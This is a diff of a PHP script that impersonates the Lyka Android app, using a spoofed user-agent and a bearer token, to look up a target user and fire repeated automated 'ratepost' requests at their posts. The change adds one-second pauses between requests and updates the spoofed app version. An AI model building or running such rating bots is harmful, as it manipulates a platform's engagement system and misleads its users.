+    } elseif ($stat == 1) $e = "[1;34m";
+    echo "$e";
+    sleep(1);
+    $url = "https://posts.mylykaapps.com/api/v3/posts/ratepost";
+    $curl = curl_init($url);
+    curl_setopt($curl, CURLOPT_URL, $url);
+    curl_setopt($curl, CURLOPT_POST, true);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+    $headers = array("authorization:Bearer $bearer", "user-agent:Lyka/3.6.21 (com.thingsilikeapp; build:821 Android O_MR1 28))", "deviceos: android", "Content-Type: application/json",);
+    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
+    $data0 = <<<DATA
 {
 	
   "device": {
@@ -1346,21 +1374,22 @@ $data0 = <<<DATA
    "userid": $fuid
 }
 DATA;
-curl_setopt($curl, CURLOPT_POSTFIELDS, $data0);
-$resp = curl_exec($curl);
-curl_close($curl);
-//var_dump($resp);
-$json = json_decode($resp);
-echo $json->message;
-echo "
+    curl_setopt($curl, CURLOPT_POSTFIELDS, $data0);
+    $resp = curl_exec($curl);
+    curl_close($curl);
+    //var_dump($resp);
+    $json = json_decode($resp);
+    echo $json->message;
+    echo "
 ";
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-$curl2 = curl_init($url);
-curl_setopt($curl2, CURLOPT_URL, $url);
-curl_setopt($curl2, CURLOPT_POST, true);
-curl_setopt($curl2, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl2, CURLOPT_HTTPHEADER, $headers);
-$data022 = <<<DATA
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    sleep(1);
+    $curl2 = curl_init($url);
+    curl_setopt($curl2, CURLOPT_URL, $url);
+    curl_setopt($curl2, CURLOPT_POST, true);
+    curl_setopt($curl2, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl2, CURLOPT_HTTPHEADER, $headers);
+    $data022 = <<<DATA
 {
 	
   "device": {
@@ -1378,21 +1407,22 @@ $data022 = <<<DATA
    "userid": $fuid
 }
 DATA;
-curl_setopt($curl2, CURLOPT_POSTFIELDS, $data022);
-$resp2 = curl_exec($curl2);
-curl_close($curl2);
-//var_dump($resp2);
-$json2 = json_decode($resp2);
-echo $json2->message;
-echo "
+    curl_setopt($curl2, CURLOPT_POSTFIELDS, $data022);
+    $resp2 = curl_exec($curl2);
+    curl_close($curl2);
+    //var_dump($resp2);
+    $json2 = json_decode($resp2);
+    echo $json2->message;
+    echo "
 ";
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-$curl3 = curl_init($url);
-curl_setopt($curl3, CURLOPT_URL, $url);
-curl_setopt($curl3, CURLOPT_POST, true);
-curl_setopt($curl3, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl3, CURLOPT_HTTPHEADER, $headers);
-$data033 = <<<DATA
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    sleep(1);
+    $curl3 = curl_init($url);
+    curl_setopt($curl3, CURLOPT_URL, $url);
+    curl_setopt($curl3, CURLOPT_POST, true);
+    curl_setopt($curl3, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl3, CURLOPT_HTTPHEADER, $headers);
+    $data033 = <<<DATA
 {
 	
   "device": {
@@ -1410,21 +1440,22 @@ $data033 = <<<DATA
    "userid": $fuid
 }
 DATA;
-curl_setopt($curl3, CURLOPT_POSTFIELDS, $data033);
-$resp3 = curl_exec($curl3);
-curl_close($curl3);
-//var_dump($resp2);
-$json3 = json_decode($resp3);
-echo $json3->message;
-echo "
+    curl_setopt($curl3, CURLOPT_POSTFIELDS, $data033);
+    $resp3 = curl_exec($curl3);
+    curl_close($curl3);
+    //var_dump($resp2);
+    $json3 = json_decode($resp3);
+    echo $json3->message;
+    echo "
 ";
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-$curl4 = curl_init($url);
-curl_setopt($curl4, CURLOPT_URL, $url);
-curl_setopt($curl4, CURLOPT_POST, true);
-curl_setopt($curl4, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl4, CURLOPT_HTTPHEADER, $headers);
-$data044 = <<<DATA
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    sleep(1);
+    $curl4 = curl_init($url);
+    curl_setopt($curl4, CURLOPT_URL, $url);
+    curl_setopt($curl4, CURLOPT_POST, true);
+    curl_setopt($curl4, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl4, CURLOPT_HTTPHEADER, $headers);
+    $data044 = <<<DATA
 {
 	
   "device": {
@@ -1442,21 +1473,22 @@ $data044 = <<<DATA
    "userid": $fuid 
 }
 DATA;
-curl_setopt($curl4, CURLOPT_POSTFIELDS, $data044);
-$resp4 = curl_exec($curl4);
-curl_close($curl4);
-//var_dump($resp2);
-$json4 = json_decode($resp4);
-echo $json4->message;
-echo "
+    curl_setopt($curl4, CURLOPT_POSTFIELDS, $data044);
+    $resp4 = curl_exec($curl4);
+    curl_close($curl4);
+    //var_dump($resp2);
+    $json4 = json_decode($resp4);
+    echo $json4->message;
+    echo "
 ";
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-$curl5 = curl_init($url);
-curl_setopt($curl5, CURLOPT_URL, $url);
-curl_setopt($curl5, CURLOPT_POST, true);
-curl_setopt($curl5, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl5, CURLOPT_HTTPHEADER, $headers);
-$data055 = <<<DATA
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    sleep(1);
+    $curl5 = curl_init($url);
+    curl_setopt($curl5, CURLOPT_URL, $url);
+    curl_setopt($curl5, CURLOPT_POST, true);
+    curl_setopt($curl5, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl5, CURLOPT_HTTPHEADER, $headers);
+    $data055 = <<<DATA
 {
 	
   "device": {
@@ -1474,21 +1506,22 @@ $data055 = <<<DATA
    "userid": $fuid
 }
 DATA;
-curl_setopt($curl5, CURLOPT_POSTFIELDS, $data055);
-$resp5 = curl_exec($curl5);
-curl_close($curl5);
-//var_dump($resp2);
-$json5 = json_decode($resp5);
-echo $json5->message;
-echo "
+    curl_setopt($curl5, CURLOPT_POSTFIELDS, $data055);
+    $resp5 = curl_exec($curl5);
+    curl_close($curl5);
+    //var_dump($resp2);
+    $json5 = json_decode($resp5);
+    echo $json5->message;
+    echo "
 ";
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-$curl6 = curl_init($url);
-curl_setopt($curl6, CURLOPT_URL, $url);
-curl_setopt($curl6, CURLOPT_POST, true);
-curl_setopt($curl6, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl6, CURLOPT_HTTPHEADER, $headers);
-$data066 = <<<DATA
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    sleep(1);
+    $curl6 = curl_init($url);
+    curl_setopt($curl6, CURLOPT_URL, $url);
+    curl_setopt($curl6, CURLOPT_POST, true);
+    curl_setopt($curl6, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl6, CURLOPT_HTTPHEADER, $headers);
+    $data066 = <<<DATA
 {
 	
   "device": {
@@ -1506,21 +1539,22 @@ $data066 = <<<DATA
    "userid": $fuid
 }
 DATA;
-curl_setopt($curl6, CURLOPT_POSTFIELDS, $data066);
-$resp6 = curl_exec($curl6);
-curl_close($curl6);
-//var_dump($resp2);
-$json6 = json_decode($resp6);
-echo $json6->message;
-echo "
+    curl_setopt($curl6, CURLOPT_POSTFIELDS, $data066);
+    $resp6 = curl_exec($curl6);
+    curl_close($curl6);
+    //var_dump($resp2);
+    $json6 = json_decode($resp6);
+    echo $json6->message;
+    echo "
 ";
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-$curl7 = curl_init($url);
-curl_setopt($curl7, CURLOPT_URL, $url);
-curl_setopt($curl7, CURLOPT_POST, true);
-curl_setopt($curl7, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl7, CURLOPT_HTTPHEADER, $headers);
-$data077 = <<<DATA
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    sleep(1);
+    $curl7 = curl_init($url);
+    curl_setopt($curl7, CURLOPT_URL, $url);
+    curl_setopt($curl7, CURLOPT_POST, true);
+    curl_setopt($curl7, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl7, CURLOPT_HTTPHEADER, $headers);
+    $data077 = <<<DATA
 {
 	
   "device": {
@@ -1538,21 +1572,22 @@ $data077 = <<<DATA
    "userid": $fuid
 }
 DATA;
-curl_setopt($curl7, CURLOPT_POSTFIELDS, $data077);
-$resp7 = curl_exec($curl7);
-curl_close($curl7);
-//var_dump($resp2);
-$json7 = json_decode($resp7);
-echo $json7->message;
-echo "
+    curl_setopt($curl7, CURLOPT_POSTFIELDS, $data077);
+    $resp7 = curl_exec($curl7);
+    curl_close($curl7);
+    //var_dump($resp2);
+    $json7 = json_decode($resp7);
+    echo $json7->message;
+    echo "
 ";
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-$curl8 = curl_init($url);
-curl_setopt($curl8, CURLOPT_URL, $url);
-curl_setopt($curl8, CURLOPT_POST, true);
-curl_setopt($curl8, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl8, CURLOPT_HTTPHEADER, $headers);
-$data088 = <<<DATA
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    sleep(1);
+    $curl8 = curl_init($url);
+    curl_setopt($curl8, CURLOPT_URL, $url);
+    curl_setopt($curl8, CURLOPT_POST, true);
+    curl_setopt($curl8, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl8, CURLOPT_HTTPHEADER, $headers);
+    $data088 = <<<DATA
 {
 	
   "device": {
@@ -1570,21 +1605,22 @@ $data088 = <<<DATA
    "userid": $fuid
 }
 DATA;
-curl_setopt($curl8, CURLOPT_POSTFIELDS, $data088);
-$resp8 = curl_exec($curl8);
-curl_close($curl8);
-//var_dump($resp2);
-$json8 = json_decode($resp8);
-echo $json8->message;
-echo "
+    curl_setopt($curl8, CURLOPT_POSTFIELDS, $data088);
+    $resp8 = curl_exec($curl8);
+    curl_close($curl8);
+    //var_dump($resp2);
+    $json8 = json_decode($resp8);
+    echo $json8->message;
+    echo "
 ";
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-$curl9 = curl_init($url);
-curl_setopt($curl9, CURLOPT_URL, $url);
-curl_setopt($curl9, CURLOPT_POST, true);
-curl_setopt($curl9, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl9, CURLOPT_HTTPHEADER, $headers);
-$data099 = <<<DATA
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    sleep(1);
+    $curl9 = curl_init($url);
+    curl_setopt($curl9, CURLOPT_URL, $url);
+    curl_setopt($curl9, CURLOPT_POST, true);
+    curl_setopt($curl9, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl9, CURLOPT_HTTPHEADER, $headers);
+    $data099 = <<<DATA
 {
 	
   "device": {
@@ -1602,21 +1638,22 @@ $data099 = <<<DATA
    "userid": $fuid
 }
 DATA;
-curl_setopt($curl9, CURLOPT_POSTFIELDS, $data099);
-$resp9 = curl_exec($curl9);
-curl_close($curl9);
-//var_dump($resp2);
-$json9 = json_decode($resp9);
-echo $json9->message;
-echo "
+    curl_setopt($curl9, CURLOPT_POSTFIELDS, $data099);
+    $resp9 = curl_exec($curl9);
+    curl_close($curl9);
+    //var_dump($resp2);
+    $json9 = json_decode($resp9);
+    echo $json9->message;
+    echo "
 ";
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-$curl10 = curl_init($url);
-curl_setopt($curl10, CURLOPT_URL, $url);
-curl_setopt($curl10, CURLOPT_POST, true);
-curl_setopt($curl10, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl10, CURLOPT_HTTPHEADER, $headers);
-$data010 = <<<DATA
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    sleep(1);
+    $curl10 = curl_init($url);
+    curl_setopt($curl10, CURLOPT_URL, $url);
+    curl_setopt($curl10, CURLOPT_POST, true);
+    curl_setopt($curl10, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl10, CURLOPT_HTTPHEADER, $headers);
+    $data010 = <<<DATA
 {
 	
   "device": {
@@ -1634,21 +1671,22 @@ $data010 = <<<DATA
    "userid": $fuid
 }
 DATA;
-curl_setopt($curl10, CURLOPT_POSTFIELDS, $data010);
-$resp10 = curl_exec($curl10);
-curl_close($curl10);
-//var_dump($resp2);
-$json10 = json_decode($resp10);
-echo $json10->message;
-echo "
+    curl_setopt($curl10, CURLOPT_POSTFIELDS, $data010);
+    $resp10 = curl_exec($curl10);
+    curl_close($curl10);
+    //var_dump($resp2);
+    $json10 = json_decode($resp10);
+    echo $json10->message;
+    echo "
 ";
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-$curl11 = curl_init($url);
-curl_setopt($curl11, CURLOPT_URL, $url);
-curl_setopt($curl11, CURLOPT_POST, true);
-curl_setopt($curl11, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl11, CURLOPT_HTTPHEADER, $headers);
-$data011 = <<<DATA
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    sleep(1);
+    $curl11 = curl_init($url);
+    curl_setopt($curl11, CURLOPT_URL, $url);
+    curl_setopt($curl11, CURLOPT_POST, true);
+    curl_setopt($curl11, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl11, CURLOPT_HTTPHEADER, $headers);
+    $data011 = <<<DATA
 {
 	
   "device": {
@@ -1666,148 +1704,149 @@ $data011 = <<<DATA
    "userid": $fuid
 }
 DATA;
-curl_setopt($curl11, CURLOPT_POSTFIELDS, $data011);
-$resp11 = curl_exec($curl11);
-curl_close($curl11);
-//var_dump($resp11);
-$json11 = json_decode($resp11);
-echo $json11->message;
-$yellow = "[0;32m";
-echo "$yellow
+    curl_setopt($curl11, CURLOPT_POSTFIELDS, $data011);
+    $resp11 = curl_exec($curl11);
+    curl_close($curl11);
+    //var_dump($resp11);
+    $json11 = json_decode($resp11);
+    echo $json11->message;
+    $yellow = "[0;32m";
+    echo "$yellow
 ";
-echo "=====================================================";
-$y = "[1;34m";
-echo "$y";
-//  $';
-//$pass322 = readline('Enter main pasword: ');
-//$pass;
-//pass322 = 'a322';
-//$user322 = '
-// For output
-$ow = "[1;33m";
-echo "$ow";
-echo "
+    echo "=====================================================";
+    $y = "[1;34m";
+    echo "$y";
+    //  $';
+    //$pass322 = readline('Enter main pasword: ');
+    //$pass;
+    //pass322 = 'a322';
+    //$user322 = '
+    // For output
+    $ow = "[1;33m";
+    echo "$ow";
+    echo "
 $vuser is RATING $user322
 ";
-$urlm = "https://users.mylykaapps.com/api/v3/users/searchsuggestedpeople?searchText=$user322&os=android&pageIndex=1&pageSize=16";
-$curlm = curl_init($urlm);
-curl_setopt($curlm, CURLOPT_URL, $urlm);
-curl_setopt($curlm, CURLOPT_RETURNTRANSFER, true);
-$headersm = array("user-agent:Lyka/3.6.16 (com.thingsilikeapp; build:816 Android O_MR1 28)", "authorization: Bearer $bearer",);
-curl_setopt($curlm, CURLOPT_HTTPHEADER, $headersm);
-$respm = curl_exec($curlm);
-curl_close($curlm);
-//var_dump($respm);
-$jsonm = json_decode($respm, true);
-$huid = $jsonm["data"]["0"]["id"];
-$hvvuser = $jsonm["data"]["0"]["userName"];
-//cho $hvvuser;
-//echo $huid;
-/*if($hvvuser == $user322){
-$urlg = "https://profiles.mylykaapps.com/api/v3/profiles/GetUser";
-//$bearer3 = $jsonn2->data->token->accessToken;
-$curlg = curl_init($urlg);
-curl_setopt($curlg, CURLOPT_URL, $urlg);
-curl_setopt($curlg, CURLOPT_POST, true);
-curl_setopt($curlg, CURLOPT_RETURNTRANSFER, true);
-
-$headersg = array(
-   "authorization: Bearer $bearer",
-   "Content-Type: application/json",
-);
-curl_setopt($curlg, CURLOPT_HTTPHEADER, $headersg);
-
-$datal = <<<DATA
-{
-  "type": "username",
-  "username": "$user322"
-}
-DATA;
-
-curl_setopt($curlg, CURLOPT_POSTFIELDS, $datal);
-
-//for debug only!
-//curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
-//curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
-
-$respg = curl_exec($curlg);
-curl_close($curlg);
-//var_dump($respg);
-$jsong = json_decode($respg);
-$cuid = $jsong->data->id;
-//echo $cuid;
-$uname = $jsong->data->userName;
-$green="[1;32m";
-echo "$green$uname is RATED
-";
-//$gmsg = $jsong->data->message;
-}
-*/
-if ($user322 == $hvvuser) {
-    $urld = "https://profiles.mylykaapps.com/api/v3/profiles/GetProfilePosts?os=android&pageIndex=1&pageSize=50&id=$huid&category=ALL";
-    $curld = curl_init($urld);
-    curl_setopt($curld, CURLOPT_URL, $urld);
-    curl_setopt($curld, CURLOPT_RETURNTRANSFER, true);
-    $headersd = array("authorization: Bearer $bearer", "user-agent:Lyka/3.6.16 (com.thingsilikeapp; build:816 Android O_MR1 28)",);
-    curl_setopt($curld, CURLOPT_HTTPHEADER, $headersd);
-    $respd = curl_exec($curld);
-    curl_close($curld);
-    $jsond = json_decode($respd, true);
-    //var_dump($respd,true);
-    /*function printValues($arr) {
-    global $count;
-    global $values;
+    $urlm = "https://users.mylykaapps.com/api/v3/users/searchsuggestedpeople?searchText=$user322&os=android&pageIndex=1&pageSize=16";
+    $curlm = curl_init($urlm);
+    curl_setopt($curlm, CURLOPT_URL, $urlm);
+    curl_setopt($curlm, CURLOPT_RETURNTRANSFER, true);
+    $headersm = array("user-agent:Lyka/3.6.21 (com.thingsilikeapp; build:821 Android O_MR1 28)", "authorization: Bearer $bearer",);
+    curl_setopt($curlm, CURLOPT_HTTPHEADER, $headersm);
+    $respm = curl_exec($curlm);
+    curl_close($curlm);
+    //var_dump($respm);
+    $jsonm = json_decode($respm, true);
+    $huid = $jsonm["data"]["0"]["id"];
+    $hvvuser = $jsonm["data"]["0"]["userName"];
+    //cho $hvvuser;
+    //echo $huid;
+    /*if($hvvuser == $user322){
+    $urlg = "https://profiles.mylykaapps.com/api/v3/profiles/GetUser";
+    //$bearer3 = $jsonn2->data->token->accessToken;
+    $curlg = curl_init($urlg);
+    curl_setopt($curlg, CURLOPT_URL, $urlg);
+    curl_setopt($curlg, CURLOPT_POST, true);
+    curl_setopt($curlg, CURLOPT_RETURNTRANSFER, true);
     
-    // Check input is an array
-    if(!is_array($arr)){
-        die("ERROR: Input is not an array");
+    $headersg = array(
+    "authorization: Bearer $bearer",
+    "Content-Type: application/json",
+    );
+    curl_setopt($curlg, CURLOPT_HTTPHEADER, $headersg);
+    
+    $datal = <<<DATA
+    {
+    "type": "username",
+    "username": "$user322"
     }
+    DATA;
     
+    curl_setopt($curlg, CURLOPT_POSTFIELDS, $datal);
     
-    foreach($arr as $key=>$value){
+    //for debug only!
+    //curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
+    //curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+    
+    $respg = curl_exec($curlg);
+    curl_close($curlg);
+    //var_dump($respg);
+    $jsong = json_decode($respg);
+    $cuid = $jsong->data->id;
+    //echo $cuid;
+    $uname = $jsong->data->userName;
+    $green="[1;32m";
+    echo "$green$uname is RATED
+    ";
+    //$gmsg = $jsong->data->message;
+    }
+    */
+    if ($user322 == $hvvuser) {
+        $urld = "https://profiles.mylykaapps.com/api/v3/profiles/GetProfilePosts?os=android&pageIndex=1&pageSize=50&id=$huid&category=ALL";
+        $curld = curl_init($urld);
+        curl_setopt($curld, CURLOPT_URL, $urld);
+        curl_setopt($curld, CURLOPT_RETURNTRANSFER, true);
+        $headersd = array("authorization: Bearer $bearer", "user-agent:Lyka/3.6.21 (com.thingsilikeapp; build:821 Android O_MR1 28)",);
+        curl_setopt($curld, CURLOPT_HTTPHEADER, $headersd);
+        $respd = curl_exec($curld);
+        curl_close($curld);
+        $jsond = json_decode($respd, true);
+        //var_dump($respd,true);
+        /*function printValues($arr) {
+        global $count;
+        global $values;
+        
+        // Check input is an array
+        if(!is_array($arr)){
+        die("ERROR: Input is not an array");
+        }
+        
+        
+        foreach($arr as $key=>$value){
         if(is_array($value)){
             printValues($value);
         } else{
             $values[] = $value;
             $count++;
         }
+        }
+        
+        // Return total count and values found in array
+        return array('total' => $count, 'values' => $values);
+        }
+        */
+        $arr = json_decode($respd, true);
+        $hp0 = $arr["data"]["0"]["id"];
+        $hp1 = $arr["data"]["1"]["id"];
+        $hp2 = $arr["data"]["2"]["id"];
+        $hp3 = $arr["data"]["3"]["id"];
+        $hp4 = $arr["data"]["4"]["id"];
+        $hp5 = $arr["data"]["5"]["id"];
+        $hp6 = $arr["data"]["6"]["id"];
+        $hp7 = $arr["data"]["7"]["id"];
+        $hp8 = $arr["data"]["8"]["id"];
+        $hp9 = $arr["data"]["9"]["id"];
+        $hp10 = $arr["data"]["10"]["id"];
+        //echo $hp10;
+        //echo $hp9;
+        
     }
-    
-    // Return total count and values found in array
-    return array('total' => $count, 'values' => $values);
-    }
-    */
-    $arr = json_decode($respd, true);
-    $hp0 = $arr["data"]["0"]["id"];
-    $hp1 = $arr["data"]["1"]["id"];
-    $hp2 = $arr["data"]["2"]["id"];
-    $hp3 = $arr["data"]["3"]["id"];
-    $hp4 = $arr["data"]["4"]["id"];
-    $hp5 = $arr["data"]["5"]["id"];
-    $hp6 = $arr["data"]["6"]["id"];
-    $hp7 = $arr["data"]["7"]["id"];
-    $hp8 = $arr["data"]["8"]["id"];
-    $hp9 = $arr["data"]["9"]["id"];
-    $hp10 = $arr["data"]["10"]["id"];
-    //echo $hp10;
-    //echo $hp9;
-    
-}
-$stat = $arr["status"];
-//echo $stat;
-if ($stat == 0) {
-    echo "check your inputs
+    $stat = $arr["status"];
+    //echo $stat;
+    if ($stat == 0) {
+        echo "check your inputs
 ";
-} elseif ($stat == 1) $e = "[1;34m";
-echo "$e";
-$url = "https://posts.mylykaapps.com/api/v3/posts/ratepost";
-$curl = curl_init($url);
-curl_setopt($curl, CURLOPT_URL, $url);
-curl_setopt($curl, CURLOPT_POST, true);
-curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
-$headers = array("authorization:Bearer $bearer", "user-agent:Lyka/3.6.16 (com.thingsilikeapp; build:816 Android O_MR1 28))", "deviceos: android", "Content-Type: application/json",);
-curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
-$data00 = <<<DATA
+    } elseif ($stat == 1) $e = "[1;34m";
+    echo "$e";
+    sleep(1);
+    $url = "https://posts.mylykaapps.com/api/v3/posts/ratepost";
+    $curl = curl_init($url);
+    curl_setopt($curl, CURLOPT_URL, $url);
+    curl_setopt($curl, CURLOPT_POST, true);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+    $headers = array("authorization:Bearer $bearer", "user-agent:Lyka/3.6.21 (com.thingsilikeapp; build:821 Android O_MR1 28))", "deviceos: android", "Content-Type: application/json",);
+    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
+    $data00 = <<<DATA
 {
 	
   "device": {
@@ -1825,21 +1864,22 @@ $data00 = <<<DATA
    "userid": $huid
 }
 DATA;
-curl_setopt($curl, CURLOPT_POSTFIELDS, $data00);
-$resp = curl_exec($curl);
-curl_close($curl);
-//var_dump($resp);
-$json = json_decode($resp);
-echo $json->message;
-echo "
+    curl_setopt($curl, CURLOPT_POSTFIELDS, $data00);
+    $resp = curl_exec($curl);
+    curl_close($curl);
+    //var_dump($resp);
+    $json = json_decode($resp);
+    echo $json->message;
+    echo "
 ";
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-$curl2 = curl_init($url);
-curl_setopt($curl2, CURLOPT_URL, $url);
-curl_setopt($curl2, CURLOPT_POST, true);
-curl_setopt($curl2, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl2, CURLOPT_HTTPHEADER, $headers);
-$data32 = <<<DATA
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    sleep(1);
+    $curl2 = curl_init($url);
+    curl_setopt($curl2, CURLOPT_URL, $url);
+    curl_setopt($curl2, CURLOPT_POST, true);
+    curl_setopt($curl2, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl2, CURLOPT_HTTPHEADER, $headers);
+    $data32 = <<<DATA
 {
   
   "device": {
@@ -1857,21 +1897,22 @@ $data32 = <<<DATA
    "userid": $huid
 }
 DATA;
-curl_setopt($curl2, CURLOPT_POSTFIELDS, $data32);
-$resp2 = curl_exec($curl2);
-curl_close($curl2);
-//var_dump($resp2);
-$json2 = json_decode($resp2);
-echo $json2->message;
-echo "
+    curl_setopt($curl2, CURLOPT_POSTFIELDS, $data32);
+    $resp2 = curl_exec($curl2);
+    curl_close($curl2);
+    //var_dump($resp2);
+    $json2 = json_decode($resp2);
+    echo $json2->message;
+    echo "
 ";
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-$curl3 = curl_init($url);
-curl_setopt($curl3, CURLOPT_URL, $url);
-curl_setopt($curl3, CURLOPT_POST, true);
-curl_setopt($curl3, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl3, CURLOPT_HTTPHEADER, $headers);
-$data33 = <<<DATA
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    sleep(1);
+    $curl3 = curl_init($url);
+    curl_setopt($curl3, CURLOPT_URL, $url);
+    curl_setopt($curl3, CURLOPT_POST, true);
+    curl_setopt($curl3, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl3, CURLOPT_HTTPHEADER, $headers);
+    $data33 = <<<DATA
 {
 	
   "device": {
@@ -1889,21 +1930,23 @@ $data33 = <<<DATA
    "userid": $huid
 }
 DATA;
-curl_setopt($curl3, CURLOPT_POSTFIELDS, $data33);
-$resp3 = curl_exec($curl3);
-curl_close($curl3);
-//var_dump($resp2);
-$json3 = json_decode($resp3);
-echo $json3->message;
-echo "
+    curl_setopt($curl3, CURLOPT_POSTFIELDS, $data33);
+    $resp3 = curl_exec($curl3);
+    curl_close($curl3);
+    //var_dump($resp2);
+    $json3 = json_decode($resp3);
+    echo $json3->message;
+    echo "
 ";
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-$curl4 = curl_init($url);
-curl_setopt($curl4, CURLOPT_URL, $url);
-curl_setopt($curl4, CURLOPT_POST, true);
-curl_setopt($curl4, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl4, CURLOPT_HTTPHEADER, $headers);
-$data34 = <<<DATA
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    $css = 0.3;
+    sleep(1);
+    $curl4 = curl_init($url);
+    curl_setopt($curl4, CURLOPT_URL, $url);
+    curl_setopt($curl4, CURLOPT_POST, true);
+    curl_setopt($curl4, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl4, CURLOPT_HTTPHEADER, $headers);
+    $data34 = <<<DATA
 {
 	
   "device": {
@@ -1921,21 +1964,22 @@ $data34 = <<<DATA
    "userid": $huid 
 }
 DATA;
-curl_setopt($curl4, CURLOPT_POSTFIELDS, $data34);
-$resp4 = curl_exec($curl4);
-curl_close($curl4);
-//var_dump($resp2);
-$json4 = json_decode($resp4);
-echo $json4->message;
-echo "
+    curl_setopt($curl4, CURLOPT_POSTFIELDS, $data34);
+    $resp4 = curl_exec($curl4);
+    curl_close($curl4);
+    //var_dump($resp2);
+    $json4 = json_decode($resp4);
+    echo $json4->message;
+    echo "
 ";
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-$curl5 = curl_init($url);
-curl_setopt($curl5, CURLOPT_URL, $url);
-curl_setopt($curl5, CURLOPT_POST, true);
-curl_setopt($curl5, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl5, CURLOPT_HTTPHEADER, $headers);
-$data35 = <<<DATA
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    sleep(1);
+    $curl5 = curl_init($url);
+    curl_setopt($curl5, CURLOPT_URL, $url);
+    curl_setopt($curl5, CURLOPT_POST, true);
+    curl_setopt($curl5, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl5, CURLOPT_HTTPHEADER, $headers);
+    $data35 = <<<DATA
 {
 	
   "device": {
@@ -1953,21 +1997,22 @@ $data35 = <<<DATA
    "userid": $huid
 }
 DATA;
-curl_setopt($curl5, CURLOPT_POSTFIELDS, $data35);
-$resp5 = curl_exec($curl5);
-curl_close($curl5);
-//var_dump($resp2);
-$json5 = json_decode($resp5);
-echo $json5->message;
-echo "
+    curl_setopt($curl5, CURLOPT_POSTFIELDS, $data35);
+    $resp5 = curl_exec($curl5);
+    curl_close($curl5);
+    //var_dump($resp2);
+    $json5 = json_decode($resp5);
+    echo $json5->message;
+    echo "
 ";
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-$curl6 = curl_init($url);
-curl_setopt($curl6, CURLOPT_URL, $url);
-curl_setopt($curl6, CURLOPT_POST, true);
-curl_setopt($curl6, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl6, CURLOPT_HTTPHEADER, $headers);
-$data36 = <<<DATA
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    sleep(1);
+    $curl6 = curl_init($url);
+    curl_setopt($curl6, CURLOPT_URL, $url);
+    curl_setopt($curl6, CURLOPT_POST, true);
+    curl_setopt($curl6, CURLOPT_RETURNTRANSFER, true);
